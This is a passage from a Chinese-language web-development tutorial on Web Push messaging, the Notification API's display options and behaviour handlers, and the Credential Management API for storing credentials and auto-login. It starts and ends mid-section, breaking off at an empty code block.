由于推送 API 的统一性，用户可能误发消息到不信任的推送服务，对消息进行加密可以确保只有浏览器端才能解密读取，防止将用户信息泄露给不合法的推送服务。

还记得最初用户订阅成功后，浏览器生成的推送订阅对象吗？里面包含了endpoint，而加密过程会使用其中的keys对象。



#### 5.3.2 推送服务的响应

现在，服务端可以向 endpoint 发送包含以上请求头的请求了，推送服务响应201表示接受调用。 其余响应状态码如下：

429 Too many requests
400 Invalid request
404 Not Found 订阅过期，需要在服务端删除保存的推送订阅对象
410 Gone 订阅失效，需要在服务端删除保存的推送订阅对象，并调用推送订阅对象的unsubscribe()方法
413 Payload size too large


#### 5.3.3 使用web-push发送消息

服务端请求推送服务，需要涉及加密，设置请求头等复杂操作，使用web-push可以帮助我们解决大部分问题。

步骤如下：

1. 使用 web-push 生成一对公私钥，还记得 pushManager 订阅时需要用到的applicationServerKey吗，我们需要公钥publicKey传递到订阅脚本所在的页面中。

2. 调用setVapidDetails为 web-push 设置生成的公私钥

3. 之前订阅时浏览器已经将推送订阅对象发送到了服务端，此时从数据库中取出。

4. 调用sendNotification向推送服务发起调用请求，如果返回错误状态码，从数据库中删除保存的推送订阅对象。

以上步骤实现代码如下：

```js
var webpush = require('web-push');
      var vapidKeys = webpush.generateVAPIDKeys(); // 1.生成公私钥
      webpush.setVapidDetails( // 2.设置公私钥
          'mailto:sender@example.com',
          vapidKeys.publicKey,
          vapidKeys.privateKey
      );
      // 3.从数据库中拿出之前保存的pushSubscription，具体实现省略
      // 4.向推送服务发起调用请求
      webpush.sendNotification(pushSubscription, '推送消息内容')
          .catch(function (err) {
              if (err.statusCode === 410) {
                  // 从数据库中删除推送订阅对象
              }
          });
```

### 5.4 显示通知

使用消息中携带的数据，展示通知，此处省略了通知对象(Notification)的配置信息，示例代码如下：

```js
self.addEventListener('push', function (event) {
    if (event.data) {
        var promiseChain = Promise.resolve(event.data.json())
                .then(data => self.registration.showNotification(data.title, {}));
        event.waitUntil(promiseChain);
    }
});
```


#### 5.4.1 如何使用通知

使用 notification 本身非常简单，只需要一行代码，但在此之前需要一些准备工作。

- 检测浏览器兼容性，获取通知权限。 execute() 方法后续会有介绍。

```js
window.addEventListener('load', () => {
    if (!('serviceWorker' in navigator)) {
        // Service Worker isn't supported on this browser, disable or hide UI.
        return;
    }

    if (!('PushManager' in window)) {
        // Push isn't supported on this browser, disable or hide UI.
        return;
    }

    let promiseChain = new Promise((resolve, reject) => {
        const permissionPromise = Notification.requestPermission(result => {
            resolve(result);
        });

        if (permissionPromise) {
            permissionPromise.then(resolve);
        }
    })
    .then(result => {
        if (result === 'granted') {
            execute();
        }
        else {
            console.log('no permission');
        }
    });
});
```

- 注册 service worker ，获取注册对象。（ service-worker.js 暂时不需要任何代码支持，空白文件也可）

```js
function registerServiceWorker() {
    return navigator.serviceWorker.register('service-worker.js')
    .then(registration => {
        console.log('Service worker successfully registered.');
        return registration;
    })
    .catch(err => {
        console.error('Unable to register service worker.', err);
    });
}
```

- 使用 showNotification 方法弹出通知。

```js
function execute() {
    registerServiceWorker().then(registration => {
        registration.showNotification('Hello World!');
    });
}
```

#### 5.4.2 参数

showNotification 方法共有两个参数，分别为：

- title - 必填 字符串类型 表示通知的标题
- options - 选填 对象类型 集合众多配置项，可用项如下：


```js
{
    // 视觉相关
    "body": "<String>",
    "icon": "<URL String>",
    "image": "<URL String>",
    "badge": "<URL String>",
    "vibrate": "<Array of Integers>",
    "sound": "<URL String>",
    "dir": "<String of 'auto' | 'ltr' | 'rtl'>",

    // 行为相关
    "tag": "<String>",
    "data": "<Anything>",
    "requireInteraction": "<boolean>",
    "renotify": "<Boolean>",
    "silent": "<Boolean>",

    // 视觉行为均会影响
    "actions": "<Array of Strings>",

    // 定时发送时间戳
    "timestamp": "<Long>"
}
```

##### 5.4.2.1 视觉部分

###### 5.4.2.1.1 标题和内容

标题可以通过 showNotification 的第一个参数设置。而通知内容可以通过配置项中的 body 进行设置。如下：

```js
registration.showNotification('Simple Title', {
     body: 'Simple piece of body text.\nSecond line of body text :)'
 });
```

通知在不同的浏览器以及不同的操作系统中展现的样式并不相同。事实上：

1. 不同的操作系统有自身的通知样式。Firefox浏览器直接使用系统通知样式

2. 特别的，Google Chrome有自己定制的样式，以保持在各个操作系统的一致性


当标题和内容长度超过一定限制时，通知会自行处理。例如在Google Chrome中会自动截断：

在Firefox中会更友善一些，当鼠标浮在内容上，会展现全部内容：


###### 5.4.2.1.2 图标

在Google Chrome下通知的左侧有一大段空白区域。这里其实是用来显示图标的，为此我们需要用到配置项的 icon ，如下：

```js
registration.showNotification('Icon Notification', {
    icon: 'path/to/icon.png'
});
```


在图标尺寸方面并没有一个明确的规定。普通情况下建议使用192px*192px以上的图片进行设置(64px*3)。

另外某些浏览器要求静态资源必须通过HTTPS访问，因此在使用第三方图片资源时要格外注意。


###### 5.4.2.1.3 小图标(Badge)

小图标(Badge)是在手机上展现通知缩略信息时使用的图标。我们可以使用如下代码

```js
registration.showNotification('Badge Notification', {
    badge: 'path/to/badge.png'
});

```

目前仅出现在Android系统的Google Chrome上

小图标的注意点和图标相同，尺寸建议为72px*72px以上(24px*3)，同样尽量使用HTTPS资源。


###### 5.4.2.1.4 图片(image)

和图标(icon)不同，图片(image)在通知的展现尺寸要大不少，可以给用户展现一些预览图片。我们可以使用如下代码

```js
registration.showNotification('Image Notification', {
    image: 'path/to/image.jpg'
});
```

因为图片相对来说还是一个比较新的配置项，因此以后可能会被修改。在Firefox中，图片暂时无法显示

###### 5.4.2.1.5 按钮(Actions)

我们可以通过使用 actions 配置项来为通知增加一些按钮，代码如下：

```js
registration.showNotification('Actions Notification', {
    actions: [
        {
            action: 'coffee-action',
            title: 'Coffee',
            icon: 'path/to/action-1.png'
        },
        {
            action: 'doughnut-action',
            title: 'Doughnut',
            icon: 'path/to/action-2.png'
        },
        {
            action: 'gramophone-action',
            title: 'gramophone',
            icon: 'path/to/action-3.png'
        },
        {
            action: 'atom-action',
            title: 'Atom',
            icon: 'path/to/action-4.png'
        }
    ]
});
```
通过以上代码，我们为通知增加了4个按钮。但事实上在不同情况下一条通知可显示的按钮数量是有限的（记录在 Notification.maxActions 变量中），超过的部分就将被省略。在本文编写时，Google Chrome允许一条通知中显示2个按钮

actions 配置项是一个数组，每个元素为一个对象，而每个对象都必须拥有3个属性。除了按钮标题和图标地址之外，每个对象还拥有一个唯一的ID，记录于 action 属性中。它会在按钮被点击时使用到，这些会在行为部分中进行介绍。

此外，在Android6.0 Marshmallow版本中，图标的颜色可能会被设置为匹配系统的颜色.


在Android Nougat版本中按钮暂时不会显示。

关于按钮图标方面，有一些建议：

1. 所有图标使用一个相同的色系，以保证给用户带来的感官是一致的。

2. 图标尺寸建议使用128px*128px

3. 某些情况下按钮不会显示，需要做好应对。

在本文编写的时候，只有Google Chrome和Opera for Android支持按钮(Actions)。


###### 5.4.2.1.6 文字方向

如果我们需要控制文字的方向，可以使用 dir 配置项。它的合法值为 'auto', 'ltr'或者'rtl'。其中'auto'会自动根据文字内容来选择方向，例如阿拉伯文会自动从右到左显示，默认值为'auto'。


###### 5.4.2.1.7 震动

我们可以使用 vibrate 配置项来设置通知的震动模式。 vibrate 以数组的形式进行配置，其中的数字以2个为一组，分别表示震动的毫秒数，和不震动的毫秒数，如此往复。

```js
registration.showNotification('Vibrate Notification', {
    vibrate: [500, 110, 500, 110, 450, 110, 200, 110, 170, 40, 450, 110, 200, 110, 170, 40, 500]
});
```

注意部分设备可能不支持 vibrate 配置项。


###### 5.4.2.1.8 声音

按照规范，声音可以使用 sound 配置项进行配置，用以在通知弹出时播放对应的音频文件。

```js
registration.showNotification('Sound Notification', {
    sound: 'path/to/sound.mp3'
});
```

然而很遗憾，目前并没有浏览器支持 sound 配置项。


###### 5.4.2.1.9 时间戳

使用 timestamp 配置项来达到定时发送通知的目的。 timestamp 配置项的值是数字类型，表示设定时间距离1970年1月1日0点的毫秒数。例子如下：

```js
registration.showNotification('Timestamp Notification', {
    body: 'Timestamp is set to "01 Jan 2000 00:00:00".',
    timestamp: Date.parse('01 Jan 2000 00:00:00')
});
```

###### 5.4.2.1.10 使用通知的一些建议

一些常见的错误，我们应当尽量避免它们：

1. 不要将站点的名字或者URL放到通知的标题或者内容中，因为浏览器会自动添加这些信息，避免造成重复。

2. 尽量使用简明扼要的通知标题和内容。假设你需要通知用户，有人给他发了一条信息，你应该使用例如“某人给你发送了一条信息”作为标题，并将消息内容放到通知内容中，而不是把标题叫做“新信息”或者把内容叫做“点击查看”。


###### 5.4.2.1.11 支持性检测

从上述配置项的分析中我们也可以看到，通知在Google Chrome和Firefox中支持的效果并不一致。

举例来说，在使用按钮(Actions)时，我们应该检测浏览器是否支持，因此我们应该使用如下代码：

```js
if ('actions' in Notification.prototype) {
    // Action buttons are supported
}
else {
    // Action buttons are NOT supported
}
```
这样就可以在不支持按钮时使用其他方式来进行通知。

##### 5.4.2.2 行为部分

默认情况下，如果只使用上述外观相关的配置项，通知的默认行为如下：

1. 对通知内容进行点击，通知没有变化

2. 新的通知会在老的通知之上显示，浏览器不会对它们进行归类或者折叠等操作

3. 根据设备的不同，可能会在通知弹出时播放声音和震动

4. 在某些设备上，通知经过一段时间会自动消失；在另外一些设备上则不会消失，直到用户点击关闭为止

5. 在这一部分，我们将讨论如何通过配置项来修改上述的默认行为。


###### 5.4.2.2.1 点击通知

默认情况下用户点击通知不会有任何变化，例如关闭通知。而事实上通知被点击则关闭比较符合我们常见的交互习惯，为了达成这个效果，我们需要在 service-worker.js 中进行事件注册，代码如下：


```js
self.addEventListener('notificationclick', event => {
    let clickedNotification = event.notification;
    clickedNotification.close();

    // 执行某些异步操作，等待它完成
    let promiseChain = doSomething();
    event.waitUntil(promiseChain);
});
```

通过 event.notification 我们可以获取到被点击的通知对象，从而获取它的属性或者调用它的方法。例子中调用了 close() 方法就可以关闭通知。

需要注意，如果我们进行了某些异步操作，那么最后的 event.waitUntil() 是必不可少的，否则会导致 service worker 运行不正常。



###### 5.4.2.2.2 点击按钮


在用户点击某个按钮时，我们可以监听 notificationclick 事件，通过 event.action 属性获得按钮的ID（对应 action 属性）。例如我们点击咖啡图标，则 event.action 的值为 'coffee-action'。我们可以参考如下代码：


```js
self.addEventListener('notificationclick', event => {
    if (!event.action) {
        // 没有点击在按钮上
        console.log('Notification Click.');
        return;
    }

    switch (event.action) {
        case 'coffee-action':
            console.log('User \'s coffee.');
            break;
        case 'doughnut-action':
            console.log('User \'s doughnuts.');
            break;
        case 'gramophone-action':
            console.log('User \'s music.');
            break;
        case 'atom-action':
            console.log('User \'s science.');
            break;
        default:
            console.log(`Unknown action clicked: '${event.action}'`);
            break;
    }
});
```

###### 5.4.2.2.3 标签(tag)

默认情况下，我们每调用一次 showNotification 方法，就发送一条通知，每条之间都是独立的，互相展开的。因此可以想见，如果连续发送多条通知，用户的手机上会充满来自同一个网站的通知，用户很容易产生负面情绪。为了解决这个问题，我们可以尝试使用 tag 来解决这个问题。


tag 的取值类型是字符串类型，是一个唯一的ID。两个相同ID的通知会被归类到一起。我们来看一下例子：

```js
registration.showNotification('Notification 1 of 3', {
    body: 'With \'tag\' of \'message-group-1\'',
    tag: 'message-group-1'
});
```

然后我们再发送一条通知，采用不同的 tag ，如下：

```js
registration.showNotification('Notification 2 of 3', {
    body: 'With \'tag\' of \'message-group-2\'',
    tag: 'message-group-2'
});
```

于是我们又收到一条通知，加上上一条就会有两条了。


在发送第三条通知时，我们采用和第一条相同的 tag ，因为和第一条的 tag 相同，所以并没有再弹出第三条通知，而是将第一条通知替换为了第三条通知。总体来看，我们调用了三次 showNotification 方法，但是用户只显示两条，防止用户体验极度恶化。


> 如果两条通知包含相同的 tag ，除了替换之外，后面一条通知将不会有声音或者震动提示。如果我们的确需要再次有声音或者震动提示，那么我们需要使用 renotify 配置。


###### 5.4.2.2.4 重新通知(renotify)

renotify 配置项是和 tag 一同使用的。在使用 tag 的同时，设置 renotify 为 true 可以让浏览器在替换通知时提示声音或者震动。最容易想到的使用场景在聊天应用中，有新消息时的提示。示例代码如下：

```js
registration.showNotification('Notification 3 of 3', {
    tag: 'message-group-1',
    renotify: true
});
```

> 注意：如果你使用了 renotify 属性但是没有使用 tag 属性，代码会有如下报错：


```text
TypeError: Failed to execute 'showNotification' on 'ServiceWorkerRegistration':
Notifications which set the renotify flag must specify a non-empty tag
```

###### 5.4.2.2.5 静默通知(silent)

silent 配置项可以让一条通知静默提示，不播放声音或者震动，适合使用在不需要用户立刻响应的通知的情景下，示例如下：

```js
registration.showNotification('Silent Notification', {
    silent: true
});
```

>  注意：如果你同时使用了 silent 和 renotify 属性，silent 会有较高的优先级，即依然为静默通知。
 

###### 5.4.2.2.6 用户交互(requireInteraction)


默认情况下，PC下的Google Chrome在展现通知一部分时间后隐藏通知；而Android系统上的Google Chrome会一直显示通知，直到用户交互，例如点击关闭按钮。

为了显式的让通知一直显示直到用户交互，我们可以设置 requireInteraction 属性。

```js
registration.showNotification('Require Interaction Notification', {
    body: 'With "requireInteraction: \'true\'".',
    requireInteraction: true
});
```

在使用这个配置项时要格外注意，这可能导致用户体验的下降，因为他必须要求用户操作才能移除通知。


### 5.4.3 常用实现


#### 5.4.3.1 通知关闭事件

在行为部分中，我们监听过 notificationclick 事件来处理通知点击。

事实上，还有一个 notificationclose 事件可以在用户关闭通知时被触发。这里的“关闭”指的是用户点击通知右上角的关闭按钮或者通过滑动通知来移除通知，点击通知并不在此列。通过监听这个事件我们可以对用户关闭通知进行统计，进而统计通知时长，评估通知效果等。

我们可以将如下代码增加到 service-worker.js 中。其中 notificationCloseAnalytics 方法是用来做一些统计工作，因为可能包含异步因此返回为 Promise 对象，也因此必须使用 waitUntil 等待其执行完成。

```js
self.addEventListener('notificationclose', event => {
    let dismissedNotification = event.notification;
    let promiseChain = notificationCloseAnalytics();
    event.waitUntil(promiseChain);
});
```

#### 5.4.3.2 通知事件的数据传递

在发送通知时通过 data 将需要的动态数据传递过去，在主程序中添加如下代码：

```js
registration.showNotification('Notification With Data', {
    body: 'This notification has data attached to it that is printed to the console when it\'s clicked.',
    data: {
        time: (new Date()).toString(),
        message: 'Hello World!'
    }
});
```


在 service-worker.js 中，我们通过 event.notification.data 来获取这个数据，如下：

```js
const notificationData = event.notification.data;
console.log('The data notification had the following parameters:');
Object.keys(notificationData).forEach(key => {
    console.log(`  ${key}: ${notificationData[key]}`);
});
```


#### 5.4.3.3 打开页面

上面一部分提过，用户通过点击通知访问某个URL是非常常见的做法。那么如何做到打开页面访问某个URL呢？我们可以通过 clients.openWindow() 方法。 如下代码可以允许我们在捕获 notificationclick 事件的处理中打开新页面：

```js
let examplePage = '/demos/notification-examples/example-page.html';
let promiseChain = clients.openWindow(examplePage);
event.waitUntil(promiseChain);
```

通过 openWindow 方法，我们可以打开新窗口，并在新窗口中打开新页面。但如果这个页面已经被打开，更好的做法不是打开新窗口，而是直接激活那个TAB。


#### 5.4.3.4 激活窗口

如果需要打开的页面已经存在，我们应该激活它而不是再打开一次。在我们讨论如何激活之前，一个非常重要的点是：我们只能激活在自己域的页面。原因是我们只能知道属于自己域的页面哪些被打开，系统防止开发者掌握用户打开的所有页面，例如那些不属于开发者域的其他页面。

先判断需要打开的页面是否已经打开了，如下：

```js
let urlToOpen = new URL(examplePage, self.location.origin).href;

let promiseChain = clients.matchAll({
    type: 'window',
    includeUncontrolled: true
})
.then(windowClients => {
    let matchingClient = null;

    for (let i = 0, max = windowClients.length; i < max; i++) {
        let windowClient = windowClients[i];
        if (windowClient.url === urlToOpen) {
            matchingClient = windowClient;
            break;
        }
    }

    return matchingClient
        ? matchingClient.focus()
        : clients.openWindow(urlToOpen);
});

event.waitUntil(promiseChain);
```
大约执行了这么几个步骤：

1. 把目标页面从字符串转化为URL类型

2. 获取已经打开的所有窗口

3. 逐个寻找匹配

4. 找到了则激活那个窗口；没有找到则打开新窗口

5. 等待这一系列执行。

第一步我们通过 new URL 来把字符串转化为URL对象，并且通过 href 属性获取地址。和原始的字符串相比，转化后的是一个绝对地址方便比较，而原始的是相对地址。

第二步我们通过如下代码获取所有打开的窗口，注意这里的窗口只包含开发者自己域下的.

```js
const promiseChain = clients.matchAll({
    type: 'window',
    includeUncontrolled: true
})
```

其中 type: 'window' 表示我们需要寻找打开的窗口和标签，不包括 web workers 。includeUncontrolled 表示不被  service worker 控制的但是属于自己域下的标签和窗口也都纳入搜索范围。一般情况下如果使用 matchAll 方法，includeUncontrolled 参数都是需要的。

第三步通过 for 循环逐个匹配。当我们找到了结果则调用 focus() 方法进行激活；否则则使用上一节提到的 clients.openWindow() 使用新窗口打开。

需要注意的是，matchingClient.focus() 和 clients.openWindow(urlToOpen) 返回的都是 Promise 对象，即链式调用。只有这样，才可以让最后一步的 event.waitUntil() 起到应有的作用。


#### 5.4.3.5 合并通知


假设每条通知的 data 都包含发送者的用户名（如X）。我们要做的第一步是获取用户那边的所有通知，从而找到是否有X发送信息的通知，代码如下：

```js
const userName = 'X';
let promiseChain = registration.getNotifications()
    .then(notifications => {
        let currentNotification;

        for(let i = 0, max = notifications.length; i < max; i++) {
            if (notifications[i].data && notifications[i].data.userName === userName) {
                currentNotification = notifications[i];
                break;
            }
        }

        return currentNotification;
    });
```


registration.getNotifications() 是一个异步方法，因此我们需要使用 then 进行后续处理，筛选出X发来的信息，进行下一步操作。

```js
promiseChain.then(currentNotification => {
    let notificationTitle;
    let options = {
        icon: userIcon
    };

    if (currentNotification) {
        // 找到之前X发送信息的通知，整合通知。
        let messageCount = currentNotification.data.newMessageCount + 1;

        options.body = `You have ${messageCount} new messages from ${userName}.`;
        options.data = {
            userName: userName,
            newMessageCount: messageCount
        };
        notificationTitle = `New Messages from ${userName}`;

        // 把之前的信息删除
        currentNotification.close();
    }
    else {
        // 没找到，则常规处理
        options.body = `"${userMessage}"`;
        options.data = {
            userName: userName,
            newMessageCount: 1
        };
        notificationTitle = `New Message from ${userName}`;
    }

    return registration.showNotification(notificationTitle, options);
});
```

#### 5.4.3.6 不要总是发送通知

正常情况当有必要我们应当发送通知给用户告知变化和信息。但有一种情况我们不应该发送通知，那就是用户正在浏览我们的站点时。

因此我们在发送通知时应当判断当前的状态并排除这种情况，代码如下：

```js
function isClientFocused() {
    return clients.matchAll({
        type: 'window',
        includeUncontrolled: true
    })
    .then(windowClients => {
        let clientIsFocused = false;

        for (let i = 0, max = windowClients.length; i < max; i++) {
            if (windowClients[i].focused) {
                clientIsFocused = true;
                break;
            }
        }

        return clientIsFocused;
    });
}
```

在“激活窗口”一节我们使用过 clients.matchAll 方法来遍历打开的（属于自己域的）窗口。这里也类似，通过查看 focused 属性来判断窗口是否处于激活状态。

当我们监听到 push 事件之后，在发送通知之前，我们可以调用上述方法来判断究竟是否需要发送通知。

```js
const promiseChain = isClientFocused()
    .then(clientIsFocused => {
        // 窗口处于激活状态，不需要发送通知
        if (clientIsFocused) {
            console.log('Don\'t need to show a notification.');
            return;
        }

        // 需要发送通知
        return self.registration.showNotification('Had to show a notification.');
    });

event.waitUntil(promiseChain);
```

#### 5.4.3.7 向页面发送信息


当自己站点的窗口处于激活状态时，我们应该避免向用户发送通知。但如果我们的确想向通知一些信息，但又不想使用这么“重”的通知呢？

这种情况我们应该让 service worker 有办法通知页面，让页面进行一些提示或者变化（这样避免了震动或者通知栏提示，避免打扰用户），对用户来说会有更好的体验。

假设我们接收到了一次 push ，首先我们需要检查我们的窗口是否处于激活状态（使用上述的 isClientFocused() 方法，但我们要把 windowClients 一并返回出来供使用），然后使用 postMessage 方法来向页面发送数据。


```js
// modify isClientFocused
function isClientFocused() {
    return clients.matchAll({
        type: 'window',
        includeUncontrolled: true
    })
    .then(windowClients => {
        let clientIsFocused = false;

        for (let i = 0, max = windowClients.length; i < max; i++) {
            if (windowClients[i].focused) {
                clientIsFocused = true;
                break;
            }
        }

        // modify here
        return {clientIsFocused, windowClients};
    });
}

const promiseChain = isClientFocused()
    .then({clientIsFocused, windowClients} => {
        // 如果处于激活状态，向页面发送数据
        if (clientIsFocused) {
            windowClients.forEach(windowClient => {
                windowClient.postMessage({
                    message: 'Received a push message.',
                    time: new Date().toString()
                });
            });
        }
        // 否则发送通知
        else {
            return self.registration.showNotification('No focused windows', {
                body: 'Had to show a notification instead of messaging each page.'
            });
        }
    });

event.waitUntil(promiseChain);
```


而在每个页面中，我们可以通过监听 message 事件来获取这些数据。在主程序中代码如下：

```js
navigator.serviceWorker.addEventListener('message', event => {
    console.log('Received a message from service worker: ', event.data);
});
```

## 6. 自动登陆


### 6.1. 传统“记住密码”功能实现

不少网站在登录界面会提供“记住密码”这样一个勾选项，方便用户省去输入账号密码，以实现网站的快速登录。

传统的“记住密码”功能主要有两种实现方式：

1. cookie存储登录信息

    + 直接利用 cookie 存储用户的用户名和密码是非常不安全的，攻击者可以通过各种漏洞访问到 cookie 从而导致用户密码泄露。
      
    + 常用做法是，当用户登录成功时，服务端为用户生成一个 token，并且写入 cookie，然后用这个 token 作为用户的标识符，供用户直接使用 Token 进行登录。Token 需要制定一系列校验策略和失效规则来确保 Token 的可靠性，因此对开发者的技术要求较高。

2. 浏览器自动填充登录信息

浏览器会对网页的文本框和表单信息进行自动记录，特别地，当表单中存在输入类型为 password 的输入框时，会触发浏览器的记住账号密码提示

- 触发浏览器记录登录信息的条件

登录页面需要存在一个包含 type="text" 和 type="password" 的表单

```html
<form>
    <p>用户名：<input type="text" name="username"></p>
    <p>密码：<input type="password" name="password"></p>
</form>
```


事实上，浏览器会获取 type="password" 的输入框，以及这个输入框之上最近的一个 type="text" 的输入框内容，分别作为登录信息中的密码和账号进行存储，比如下面的表单结构：

```html
<form>
    <p>用户名1：<input type="text" name="username1"></p>
    <p>用户名2：<input type="text" name="username2"></p>
    <p>密码：<input type="password" name="password"></p>
    <p><input type="submit" value="提交"></p>
</form>
```

- 自动填充功能拓展

在表单字段中添加 autocomplete 属性，能够让登录信息的自动填充过程变得更友好些。假设表单结构如下所示：

```html
<form>
    <p>用户名：<input type="text" name="usr" autocomplete="username"></p>
    <p>密码：<input type="password" name="pwd" autocomplete="current-password"></p>
    <p><input type="submit" value="提交"></p>
</form>
```


在触发自动填充时，会增加如下提示：

autocomplete 属于 HTML5 中的新属性，该属性原先支持的值为 on | off，表示对应的输入框自动填充功能的打开或者关闭，默认值为 on。目前 autocomplete 的值新增了部分有助于自动填充功能的标记符，如上面表单提到的 username、current-password 等等。


### 6.2. 凭证管理 API
   
   
凭据管理 API（Crediential Management API），可以把用户的登录信息直接存储于客户端中，这些信息不会写到 cookie 中，因此安全性很高。同时因为账号密码直接写入本地，安全性和可靠性由浏览器保证，因此就不需要额外设计 token 之类的机制进行校验，从而大大降低开发难度。
  
  
#### 6.2.1 登录流程的异步改造

登录信息只有在验证用户登录成功之后才能进行存储，这样的登录信息才会有意义。为了能够获知用户登录成功，同时在登录成功之后调用凭证管理 API 进行用户登录信息存储，登录流程需要进行异步改造。

登录流程需要完成以下三步：

1. 实现异步登录；
2. 登录成功后调用凭证管理 API 进行登录信息存储；
3. 完成登录成功后页面切换或者是 UI 更新之类的操作。  
  

#### 6.2.2 凭据存储

需要调用 navigator.credentials.store() 这个方法进行登录信息存储。由于仅有部分浏览器支持凭据管理 API，因此在使用前需要进行方法是否存在的判断:

```js
if (navigator.credentials) {
    // 使用 navigator.credentials.store 进行凭证存储
}
```

navigator.credentials.store 的方法定义如下：

{Promise} navigator.credentials.store({Credetial} cred)

存储凭证的方法

返回 {Promise} : promise 对象，存储操作完成时，会返回所存储的 cred 的值。

navigator.credentials.store 之所以是个异步操作，是因为在调用该方法时，浏览器会弹出提示框询问用户是否对登录信息进行存储，如图所示：

[!save](/images/save-dialog.jpg)

只有当用户选择“保存”时，浏览器才会将登录信息存储起来，点击取消则 promise 将变成 reject。

参数

{Credetial} cred: 凭证对象
凭证管理 API 提供了两凭据对象：PasswordCredential 和 FederatedCredential，这两种凭据对象均实现了 Credential 的接口，可以分别针对 账号密码登录 和 第三方登录 两种模式的登录信息进行存储。

如：

```js
// 账号密码登录凭证登录
if (navigator.credentials) {
    var cred = new PasswordCredential({
        id: 'TEST_ID_NUMBER',
        password: 'TEST_PASSWORD',
        name: 'TEST_NICK_NAME',
        iconURL: 'path/to/icon'
    });
    navigator.credentials.store(cred).then(cred => {
        // 后续操作
    });
}

/* ------------------------------------ */

// 第三方登录凭证存储
if (navigator.credentials) {
    var cred = new FederatedCredential({
        id: 'TEST_ID_NUMBER',
        provider: 'http://MOCK_PROVIDER',
        name: 'TEST_NICK_NAME',
        iconUrl: 'path/to/icon'
    });
    navigator.credentials.store(cred).then(cred => {
        // 后续操作
    });
}
```


#### 6.2.2 凭据获取

通过 navigator.credentials.get() 方法，可以获取同个域名下用户存储的登录信息。

举例代码如下：

```js
if (navigator.credentials) {
    navigator.credentials.get({
        password: true
    });
}
```

如果该域名事先有调用凭证管理 API 进行登录信息存储，在执行上述代码时，将会弹出账号选择器供用户进行账户选择：

[!a](/images/multi-select.jpg)


如果存储的登录信息只有一个，那么还将会隐去账号选择器而直接将唯一的登录信息返回，并且在界面上产生如下提示信息:目前登陆的账号是xxxxx

navigator.credentials.get 方法的定义如下：

{Promise} navigator.credentials.get({Object} options)

获取凭证的方法

返回

{Promise} : promise 对象，当获取凭证操作完成时，会返回所存储的凭证，如果找不到对应的凭证时，则返回 null。
参数

options 包含以下字段：

- password: {boolean} 是否支持通过密码认证登录
- federated: 第三方登录 {Object}
 + providers: {Array} 联合登录账号供应者 id 组成的数组
- unmediated: {boolean} 是否显示账号选择器


1. 获取账号密码登录凭证

只有当 options.password === true 时，账号选择器才会展示类型为 PasswordCredential 的登录信息。

2. 获取第三方登录凭证配置信息

只有当 federated.providers 配置了相应的第三方登录账号提供者 id 列表，账号选择器才会展示类型为 FederatedCredential，同时账号提供者在 providers 列表中的登录信息。

3. 获取登录信息过滤

可以通过配置不同的 options 去实现账号信息的过滤，减少用户的选择。比如配置如下的时候：

```js
navigator.credentials.get({
    password: true,
    federated: {
        providers: ['https://www.baidu.com']
    }
})
```
所有的账号密码凭证和第三方登录凭证信息都会罗列出来：

[!third](/images/third-party-select.jpg)

其中带提供方标识的属于第三方登录凭证信息。

如果只选择获取账号密码凭证：账号选择器将只显示帐号密码凭证信息.

```js
navigator.credentials.get({password: true})
```


只选择获取第三方登录凭证：账号选择器将只显示第三方凭证信息.

```js
navigator.credentials.get({
    federated: {
        providers: ['https://www.baidu.com']
    }
})
```

事实上，如果站点支持多种第三方登录的话，还可以通过配置不同的 providers 数组来进一步缩小第三方登录信息的选择范围。

4. 自动登录

有时对于用户来说，在同一个网站仅仅保存了一个账号的情况下，在登录时仍然弹出账号选择器让用户选择的这个过程会显得有些多余。因此可以将 options.unmediated 设置为 true，在调用 navigator.credentials.get(options) 时，能够直接返回一个登录信息，省去账号选择器的显示与选择，帮助用户实现自动登录。自动登录需要满足以下条件：

- 浏览器已经显式地告知用户正在进行自动登录
- 用户曾经通过凭证管理 API 登录了网站
- 用户在该网站只保存了一个认证对象
- 用户在上一次访问时没有主动退出登录

> 当任一条件不满足时，这个方法将会被 reject 或者是返回的凭证为 undefined，在这种情况下账号选择器也不会显示出来，这时用户就只能手动输入账号密码了...

因此不太建议将 unmediated 设为 true，而是不对其进行任何赋值操作，让浏览器自动去判断是应该显示账号选择器还是直接实现自动登录。

在满足条件的情况下，调用 navigator.credentials.get(options) 方法时将不会显示账号选择器，而是直接将唯一的账号信息返回，同时显式地弹出如下提示:

[!auto-login](/images/auto-login.jpg)


#### 6.2.3 退出登陆

当用户退出网站时，应该确保用户在下次访问的时候不会自动登录。可以通过调用 navigator.credentials.requireUserMediation() 或 navigator.credentials.preventSilentAccess() 来关闭自动登录。Chrome 60+ 后，requireUserMediation 被重命名为 preventSilentAccess，请注意兼容。

```js
app.logout = function () {
    // 处理登出流程
    if (navigator.credentials.requireUserMediation) {
        navigator.credentials.requireUserMediation();
    }
    else if (navigator.credentials.preventSilentAccess) {
        navigator.credentials.preventSilentAccess();
    }
};
```


这样调用 app.logout() 登出后，如果调用 navigator.credentials.get() 时，将不会触发自动登录。


### 6.3. 账号密码凭证管理

网站通常会自己实现一套登录系统，需要账号和密码作为登录信息。使用凭证管理 API 进行账号密码凭证管理，即可方便快捷地实现自动登录，提升用户体验。

凭证管理 API 提供了 PasswordCredential 凭据对象，需要将账号密码信息转换为凭证之后再进行存取操作。

PasswordCredential 实现了 Credetial 的接口。PasswordCredential 初始化传入的对象需要包含以下信息：

- id: 必须 账号
- password: 必须 密码
- name: 非必需 用户名
- iconURL: 非必需 用户头像，注意 URL 三个字母均为大写

如：

```js
let cred = new PasswordCredential({
    id: profile.id,
    password: profile.password,
    name: profile.name,
    iconURL: profile.iconUrl
});
```

其中 name 和 iconURL 是用于账号选择器的显示，因为相比于不易阅读的账号，使用用户名和头像进行账号区分，会显得更加友好。可以在用户登录成功时，从服务端返回相应的信息供存储。

#### 6.3.1 存储登录信息

调用 navigator.credentials.store() 这个方法进行登录信息存储，如：

```js
if (navigator.credentials) {
    var cred = new PasswordCredential({
        id: formData.get('usr'),
        password: formData.get('pwd'),
        // name: nickName,
        // iconURL: iconUrl
    });
    var promise = navigator.credentials.store(cred);
    // 后续操作
}
```

此时会弹出对话框询问用户是否对登录信息进行存储,只有当用户选择“保存”时，浏览器才会将登录信息存储起来，点击取消则 promise 将变成 reject。


#### 6.3.2 获取用户登录信息

在调用 navigator.credentials.get() 方法时，需要传入参数 password: true 才能够返回类型为 PasswordCredential 的登录信息。

举例代码如下：

```js
if (navigator.credentials) {
    navigator.credentials.get({
        password: true
    });
}
```

在获取到登录信息之后，可以通过判断 cred.type === 'password' 来进一步确认获取到的登录信息属于 PasswordCredential 类型：


```js
